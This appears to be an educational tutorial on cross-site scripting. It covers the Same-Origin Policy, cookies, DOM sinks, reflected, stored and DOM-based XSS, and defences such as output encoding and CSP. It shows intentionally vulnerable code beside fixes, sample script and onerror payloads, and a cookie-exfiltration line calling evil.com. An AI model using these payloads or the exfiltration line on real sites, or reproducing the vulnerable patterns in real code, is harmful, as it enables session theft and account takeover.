📖 Chapter 1

Introduction to XSS

Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to execute malicious scripts in other users' browsers. Understanding it is essential for every developer and security professional.

🎯 What is Cross-Site Scripting?

Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts — typically JavaScript — into web content viewed by other users. The victim's browser executes the script because it trusts content from the website's origin, not knowing the script was injected by an attacker.

💡
OWASP Definition:

"Cross-Site Scripting attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end user."

🔤
Why "XSS" and not "CSS"?

The abbreviation is XSS (not CSS) to avoid confusion with Cascading Style Sheets. The "X" stands for "Cross" in Cross-Site Scripting.

🌐 5 Types of XSS at a Glance

↩️

Reflected XSS

Non-persistent. Payload is in the URL and reflected by the server. Requires victim to click a malicious link.

Non-Persistent Most Common
💾

Stored XSS

Persistent. Payload is stored on the server. Executes for every user who views the infected content.

Persistent Critical Impact
🔀

DOM-Based XSS

Client-side only. Server never sees the payload. Exploits JavaScript DOM manipulation in the browser.

Client-Side Hard to Detect
👁️‍🗨️

Blind XSS

Stored XSS variant where payload executes in a hidden context the attacker can't directly see — like an admin panel, log viewer, or internal tool.

Hidden Execution Critical
🪞

Self-XSS

Only affects the user who inputs it. Not exploitable against others unless chained with CSRF or login CSRF to trick a victim.

Self-Harm Low Severity

Web Fundamentals

Before diving into XSS attacks, you must understand how browsers work, the Same-Origin Policy, how cookies manage sessions, and how the DOM renders pages.

🌐 The Same-Origin Policy (SOP)

The Same-Origin Policy is the most critical browser security mechanism relevant to XSS. It restricts how scripts from one origin can interact with resources from another origin. An "origin" is defined by three components:

URL Anatomy
https://www.example.com:443/path/page.html ───── ─────────────── ─── │ │ │ Scheme Host Port ←──────── ORIGIN ────────→
URL AURL BSame Origin?Reason
http://example.com/a http://example.com/b ✅ Yes Same scheme, host, port
http://example.com https://example.com ❌ No Different scheme (http vs https)
http://example.com http://sub.example.com ❌ No Different host (subdomain)
http://example.com http://example.com:8080 ❌ No Different port
🔑
Why SOP Matters for XSS:

When XSS succeeds, the malicious script runs within the origin of the vulnerable website, effectively bypassing SOP completely. The browser sees the injected script as legitimate code from the trusted site!

🍪 Cookies & Session Management

Cookies are how web applications track user sessions. When a user logs in, the server creates a session and sends a cookie to the browser. If an attacker can steal this cookie via XSS, they can impersonate the user.

Cookie FlagPurposePrevents XSS Cookie Theft?
HttpOnly Prevents JavaScript from accessing the cookie via document.cookie ✅ YES — Primary defense
Secure Cookie only sent over HTTPS connections ⚠️ Partial (protects transit)
SameSite=Strict Cookie never sent in cross-site requests ⚠️ Partial (prevents CSRF)
SameSite=Lax Cookie sent in top-level navigations only ⚠️ Partial
No Flags Default — no extra protections ❌ VULNERABLE
Without HttpOnly
// ❌ Cookie is ACCESSIBLE to JavaScript console.log(document.cookie); // Output: "sessionId=abc123; token=xyz789" // Attacker can steal it: fetch('https://evil.com?c=' + document.cookie);
With HttpOnly ✅
// ✅ Cookie is HIDDEN from JavaScript console.log(document.cookie); // Output: "" (empty string!) // Cookie still sent in HTTP headers // but JS can't read it = safe from XSS

🌳 The Document Object Model (DOM)

The DOM is a tree-like representation of an HTML page that JavaScript can read and modify. Understanding the DOM is crucial because DOM-based XSS exploits happen when JavaScript writes user-controlled data into dangerous DOM sinks.

⚠️
Dangerous DOM Methods (Sinks)
JavaScript — AVOID with user input
element.innerHTML = userInput; element.outerHTML = userInput; document.write(userInput); eval(userInput); setTimeout(userInput, 1000); location.href = userInput; jQuery('#el').html(userInput);
✅
Safe DOM Methods
JavaScript — SAFE to use
element.textContent = userInput; element.setAttribute('value', input); element.classList.add(safeClass); document.createTextNode(input); jQuery('#el').text(userInput); // Always validate URLs before using! // Use textContent, NOT innerHTML

URL encoding converts special characters into percent-encoded format. Attackers use encoding to bypass filters, while developers use it to safely handle user input in URLs.

Key Takeaway:

These 4 fundamentals — SOP, HTTP, Cookies, and DOM — form the foundation of all XSS attacks. The SOP should prevent cross-origin access, but XSS bypasses it by executing within the trusted origin. Cookies without HttpOnly can be stolen. Dangerous DOM methods enable client-side injection.

Reflected XSS

The most common type of XSS. The malicious payload is included in the request (usually the URL) and "reflected" back by the server in its HTTP response without proper sanitization.

Type 1Classification
~75%of all XSS reports
URLPayload location

🔄 How Reflected XSS Works

Reflected XSS requires a victim to click a crafted URL. Here's the step-by-step attack flow:

1
😈

Attacker Crafts Malicious URL

Creates a URL with an XSS payload in a query parameter: site.com/search?q=<script>alert(1)</script>

2
📧

Social Engineering — Deliver the Link

Sends the URL via email, SMS, social media, forum post, or URL shortener to disguise the malicious payload. The victim thinks they're clicking a normal link.

3
🖥️

Server Reflects Payload Without Sanitizing

The vulnerable server takes the user input from the URL and includes it directly in the HTML response without encoding: <h2>Results for: <script>alert(1)</script></h2>

4
🌐

Victim's Browser Executes the Script

The browser parses the HTML response, finds the injected <script> tag, and executes it — because it came from the trusted website origin.

5
💀

Attack Succeeds — Data Stolen

Cookies are sent to attacker's server, fake login form is shown, keylogger is installed, or account actions are performed — all without the victim's knowledge.

📝 Vulnerable vs. Fixed Code

PHP — Search Page
// ❌ VULNERABLE — User input reflected directly $search = $_GET['q']; echo "<h2>Results for: " . $search . "</h2>"; // If q = <script>alert(1)</script> // Output: <h2>Results for: <script>alert(1)</script></h2> // → Browser executes the script! // ───────────────────────────────────────────── // ✅ FIXED — HTML encode the output $search = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); echo "<h2>Results for: " . $search . "</h2>"; // Output: <h2>Results for: &lt;script&gt;alert(1)...</h2> // → Browser shows text, does NOT execute!
Node.js / Express
// ❌ VULNERABLE app.get('/search', (req, res) => { const query = req.query.q; res.send(`<h2>Results for: ${query}</h2>`); }); // ✅ FIXED — Using escape-html library const escapeHtml = require('escape-html'); app.get('/search', (req, res) => { const query = escapeHtml(req.query.q); res.send(`<h2>Results for: ${query}</h2>`); });
Python / Flask
# ❌ VULNERABLE — Raw string interpolation @app.route('/search') def search(): query = request.args.get('q', '') return f'<h2>Results for: {query}</h2>' # ✅ FIXED — Use Jinja2 templates (auto-escapes!) @app.route('/search') def search(): query = request.args.get('q', '') return render_template('search.html', query=query) # In template: {{ query }} auto-encodes HTML entities
Java Servlet
// ❌ VULNERABLE String query = request.getParameter("q"); response.getWriter().println( "<h2>Results for: " + query + "</h2>" ); // ✅ FIXED — Using OWASP Java Encoder import org.owasp.encoder.Encode; String query = request.getParameter("q"); response.getWriter().println( "<h2>Results for: " + Encode.forHtml(query) + "</h2>" );

💾 Chapter 4

Stored XSS

The most dangerous type of XSS. The malicious payload is permanently saved on the server — in a database, file system, or cache — and executes for every single user who views the infected content.

Type 2 Classification
Critical Severity Rating
∞ Victims per payload
💀
Key Difference from Reflected XSS:

In Reflected XSS, the attacker must trick each victim into clicking a link. In Stored XSS, the payload is saved once and fires automatically for every visitor — including administrators. No social engineering needed after the initial injection!

🔀 Chapter 5

DOM-Based XSS

The invisible attacker. The server never sees the payload — the entire attack happens in the browser through JavaScript DOM manipulation. Traditional server-side tools completely miss it.

Type 0 Classification
100% Client-Side
WAF Blind Very hard to detect
🔑
Key Difference:

In Reflected/Stored XSS, the server includes the payload in the HTML response. In DOM-based XSS, the server sends a completely clean response — the vulnerability is in how the client-side JavaScript processes user-controlled data. The server is innocent!

🔍 Source → Sink: The Core Concept

DOM XSS requires two elements: a Source (where attacker-controlled data enters JavaScript) and a Sink (a dangerous function that renders or executes the data). When untrusted data flows from Source to Sink without validation, DOM XSS occurs.

🔄 Attack Flow

1
😈

Attacker Crafts URL with Payload in Fragment

vulnerable.com/welcome#<img src=x onerror=alert(1)> — The # fragment is never sent to the server!

2
📧

Victim Clicks the Link

Browser sends request to server. Server responds with clean HTML + vulnerable JavaScript code. The server never sees the fragment.

3
💀

JavaScript Reads Fragment → Writes to innerHTML

Client-side JS reads location.hash (SOURCE) and sets it as element.innerHTML (SINK). The browser parses the HTML, finds the event handler, and executes the script.

📝 Vulnerable Code Examples

JavaScript — DOM XSS via location.hash + innerHTML
// ❌ VULNERABLE — Classic DOM XSS // URL: page.html#<img src=x onerror=alert(document.cookie)> var name = decodeURIComponent(location.hash.substring(1)); // ↑ SOURCE: attacker-controlled data from URL fragment document.getElementById('greeting').innerHTML = "Hello, " + name; // ↑ SINK: renders HTML + executes JS // ──────────────────────────────────────────────────────────── // ✅ FIXED — Use textContent (safe sink) var name = decodeURIComponent(location.hash.substring(1)); document.getElementById('greeting').textContent = "Hello, " + name; // ↑ Renders as TEXT, not HTML // ──────────────────────────────────────────────────────────── // ❌ Other vulnerable patterns: document.write(location.href); // Source → Sink eval(location.search.split('=')[1]); // EXTREMELY dangerous $('#result').html($.urlParam('q')); // jQuery sink element.insertAdjacentHTML('beforeend', input);// HTML insertion setTimeout(userInput, 1000); // String eval

🕵️ Why It's Invisible to Traditional Security

❌
What FAILS to Detect It
  • ✗ Server-side WAF — never sees the fragment payload
  • ✗ Server-side logging — fragment not in access logs
  • ✗ Input validation on server — no input to validate
  • ✗ Output encoding on server — response is already clean
  • ✗ Traditional DAST scanners miss many DOM XSS
✅
What WORKS
  • ✓ Browser DevTools (Sources tab + breakpoints)
  • ✓ Burp Suite DOM Invader extension
  • ✓ Manual code review for Source → Sink flows
  • ✓ Static analysis (Semgrep, CodeQL)
  • ✓ Trusted Types API (browser-level defense)
  • ✓ Using textContent instead of innerHTML

Try <img src=x onerror=alert(1)> — the image fails to load, triggering the JavaScript in the onerror event handler.
4
Key insight: The server sends the SAME response regardless of the URL fragment. The attack is 100% in the browser-side JavaScript!
🛡️
Prevention: Replace element.innerHTML with element.textContent. Never pass user data to dangerous sinks!

🛡️ Chapter 8

XSS Prevention

Defense requires multiple layers working together. No single technique is sufficient — you need output encoding, Content Security Policy, sanitization, and secure coding practices as a unified strategy.

🏆
The Golden Rule of XSS Prevention:

Never trust user input. Always encode output based on the CONTEXT where it appears. Context-aware output encoding is the #1 defense against XSS.

🔐 Defense in Depth — 6 Layers

📤

Output Encoding Primary Defense

Convert dangerous characters (< > " ' &) to safe HTML entities before rendering. Must be context-specific: HTML body, attribute, JS, URL, CSS.

🧹

HTML Sanitization

For rich text content (WYSIWYG editors), use a whitelist-based sanitizer like DOMPurify to strip dangerous tags while preserving safe formatting.

📋

Content Security Policy

HTTP header restricting which scripts can run. Even if XSS payload is injected, CSP can block its execution. Use nonces for inline scripts.

🍪

Cookie Security

Set HttpOnly (blocks JS access), Secure (HTTPS only), and SameSite (prevents CSRF) flags on all session cookies.

✅

Safe DOM APIs

Use textContent instead of innerHTML, avoid eval(), validate URLs before use, and use setAttribute() for HTML attributes.

🔒

Trusted Types

Browser API that enforces type-safe DOM manipulation. Requires sanitized typed objects for dangerous sinks — prevents DOM XSS at the browser level.

📝 Context-Specific Encoding Rules

ContextEncoding MethodCharacters to EncodeExample
HTML Body HTML Entity Encoding & < > " ' / &lt;script&gt; shows as text
HTML Attribute HTML Attribute Encoding All non-alphanumeric → &#xHH; Always quote attributes!
JavaScript JavaScript String Encoding Non-alphanumeric → \uXXXX JSON.stringify(input)
URL Parameter URL / Percent Encoding Non-alphanumeric → %HH encodeURIComponent(input)
CSS Value CSS Encoding Non-alphanumeric → \XXXXXX Avoid user input in CSS if possible

📋 Content Security Policy (CSP)

CSP is an HTTP response header that tells the browser which scripts are allowed to execute. Even if an attacker injects a script, CSP can prevent it from running.

HTTP Header — CSP Examples (Progressive)
# ═══════════════════════════════════════════════ # Level 1: Basic CSP — Blocks inline scripts # ═══════════════════════════════════════════════ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; object-src 'none'; frame-ancestors 'self'; # ═══════════════════════════════════════════════ # Level 2: Strict CSP with Nonces (RECOMMENDED) # ═══════════════════════════════════════════════ Content-Security-Policy: default-src 'none'; script-src 'nonce-{RANDOM}' 'strict-dynamic'; style-src 'nonce-{RANDOM}'; img-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; # In HTML — only scripts with matching nonce run: # <script nonce="RANDOM">...</script> ← RUNS ✅ # <script>alert(1)</script> ← BLOCKED ❌ # Attacker can't predict the random nonce!
✅
Strong CSP:

'nonce-{random}' + 'strict-dynamic' — only scripts with matching nonce execute. Attacker can't predict the nonce value.

❌
Weak CSP:

'unsafe-inline' or 'unsafe-eval' — completely defeats the purpose of CSP! Avoid at all costs.

📡 Essential Security Headers

Complete Security Headers — Nginx
# XSS & Injection Defense add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always; add_header X-Content-Type-Options "nosniff" always; # Clickjacking Defense add_header X-Frame-Options "DENY" always; # Transport Security add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always; # Privacy add_header Referrer-Policy "strict-origin-when-cross-origin" always; # Feature Control add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always; # DISABLE legacy XSS filter (can cause issues) add_header X-XSS-Protection "0" always;
